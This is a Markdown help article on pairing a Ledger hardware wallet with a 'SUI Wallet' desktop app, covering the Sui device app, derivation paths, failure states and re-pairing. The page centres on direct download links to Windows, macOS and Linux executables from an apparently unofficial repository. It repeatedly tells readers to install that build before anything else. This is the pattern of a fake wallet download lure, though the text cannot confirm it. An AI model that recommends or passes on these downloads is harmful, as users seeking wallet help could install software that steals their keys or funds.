![SUI Wallet](assets/banner-article.png)

# Pairing Ledger with SUI Wallet

The Sui app on the device, then the connection, then the account.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Pairing connects a Ledger device to the app so that the app can ask the device to sign. The keys never leave
the device. If pairing fails, the app distinguishes a device that is not detected, a wrong derivation path
and a request waiting for approval, and it offers re-pairing without wiping anything.

## What pairing does

Pairing is a handshake, not an import. The app learns which accounts the device can sign for; it does not
learn the key, and the key never travels. From then on, a transaction signed with that account has to be
approved on the device itself, which is the entire point of the arrangement.

That is also why a Ledger-backed account behaves differently at the moment of signing: the approval happens
somewhere you can see and touch, not in a window on the screen you are already looking at.

The practical consequence is that a Ledger-backed account cannot be used absent-mindedly. Every signature waits for a physical confirmation, which is inconvenient exactly when it should be: a site asking for something you did not intend gets a prompt you have to look at, on a device you have to pick up.

## The steps, with the device unlocked

Connect the device, unlock it with its PIN, open the Sui app on the device, and then start the pairing in
the wallet. Order matters: a device sitting on its dashboard is not ready to answer, and a device that
locks part-way through will drop the connection.

The models this wallet supports are the Nano S Plus, Nano X, Stax and Flex, through the official Sui app
on the device. [Installing the Sui app on Ledger](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/installing-the-sui-app-on-ledger.md) covers getting that app onto the device if it
is not there yet.

## The Sui app on the device

The device needs the Sui app open, not merely installed. A Ledger can only run one app at a time, so a
device left on a different app answers nothing - and the wallet's error will say it cannot reach the
device rather than that the wrong app is open.

That mismatch is the single most common cause of a failed pairing and the easiest to fix: press the button,
choose Sui, then try again.

## Account discovery and derivation paths

A device can hold more than one account, and the derivation path is how the app asks for a specific one.
Ask for the wrong path and you get an account the device can sign for but which is not the one you meant -
which looks like a pairing that half-worked.

The app's failure states separate this from a device that is simply not connected, which matters because the
fixes are different: one is a path choice, the other is a cable or a locked screen.

Discovery is the part of pairing that gets skipped: the device is connected, the app is open, and the account on screen is not the one that holds the balance. Checking the address before signing anything is what prevents a signature being approved for an account the reader did not mean.

## The three failure states

| What the app says | What is happening | What to do |
| --- | --- | --- |
| Device not detected | the app cannot see it at all | cable, port, unlock, Sui app open |
| Wrong derivation path | the device is there, the account is not | choose the path that matches the account you meant |
| Waiting for approval | the request is on the device | look at the device and confirm |

Those three cover nearly every report, and they are deliberately separate rather than one connection-failed message: each has a different answer, and collapsing them into a single error is how readers end up resetting a device that only needed the right app open.

The table is also the order worth checking in. A cable problem produces the first row, a path problem the second, and a stalled approval the third; starting at the top costs nothing and rules out the most common cause before anything else is touched.

## Re-pairing without resetting

Re-pairing does not require wiping the device, and nothing in this process asks you to. A reset would destroy a recovery phrase that has nothing to do with the wallet software, which is why the app offers re-pairing instead of a factory reset.

If a guide tells you to reset the device to fix a connection, stop and read
[Ledger not detected in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/ledger-not-detected-in-sui-wallet.md) instead - it walks the same three states from the device's
side. Install the current release first if the app's messages do not match this page: the reported problems
are fixed in the current release on the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

## FAQ

### How do I pair a Ledger device with SUI Wallet?

Unlock the device, open the Sui app on it, then start pairing in the wallet. Approve the connection on the
device when it asks.

### Is Sui compatible with Ledger?

Yes. Ledger supports Sui through its official Sui app, and this wallet pairs with the Nano S Plus, Nano X,
Stax and Flex.

### Does SUI Wallet support hardware wallets other than Ledger?

Ledger is the hardware wallet this product documents. Treat any other device claim as unverified unless the
app itself offers it.

### Can I lose my crypto on Ledger?

The keys stay on the device, so a compromised computer cannot sign without your approval on the device. What
you can lose is the device, which is why its recovery phrase matters as much as any other.

### Do I need to reset the device to re-pair?

No. Re-pairing is offered without a reset, and a reset would destroy a recovery phrase that has nothing to
do with this wallet.
